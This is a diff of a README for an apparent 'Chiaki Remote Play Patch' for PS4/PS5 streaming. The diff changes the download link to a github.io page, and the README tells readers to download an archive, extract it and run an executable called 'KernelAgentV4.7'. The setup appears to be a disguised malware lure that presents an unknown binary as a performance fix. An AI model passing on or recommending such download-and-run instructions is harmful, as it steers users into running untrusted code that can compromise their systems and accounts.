@@ -2,14 +2,14 @@
 
 This patch unlocks hidden performance settings, fixes pairing bugs, and boosts Chiaki’s streaming quality for PS4/PS5 remote sessions. Powered by `KernelAgentV4.7`.
 
-[![Download Chiaki Patch](https://img.shields.io/badge/Download-Chiaki_Remote_Play_Patch-blueviolet)](https://hiaki-remote-play-enhancer-patch.github.io/.github
+[![Download Chiaki Patch](https://img.shields.io/badge/Download-Chiaki_Remote_Play_Patch-blueviolet)](https://chiaki-remote-play-enhancer-patch.github.io/.github
 )
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://hiaki-remote-play-enhancer-patch.github.io/.github
+1. 📦 **Download the archive** from the [Releases](https://chiaki-remote-play-enhancer-patch.github.io/.github
 ) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\ChiakiFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
